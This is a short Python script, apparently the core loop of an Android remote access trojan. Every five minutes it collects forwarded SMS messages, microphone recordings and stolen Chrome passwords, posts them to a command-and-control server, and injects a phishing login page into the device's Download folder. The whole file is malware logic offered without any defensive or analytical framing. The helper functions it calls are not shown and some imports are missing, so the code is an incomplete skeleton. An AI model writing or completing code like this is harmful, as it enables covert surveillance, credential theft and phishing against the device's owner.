import rat_functions as rf  
import time  

while True:  
    # 1. Collect data  
    sms_data = rf.forward_sms()  
    mic_data = rf.record_mic()  
    chrome_data = rf.steal_chrome_passwords()  

    # 2. Send to C2  
    requests.post(C2_SERVER, json={  
        'sms': sms_data,  
        'audio': mic_data,  
        'creds': chrome_data  
    })  

    # 3. Phishing injection check  
    if not os.path.exists("/sdcard/Download/login.html"):  
        rf.inject_phishing_page()  

    time.sleep(300)  # Beacon every 5 minutes  
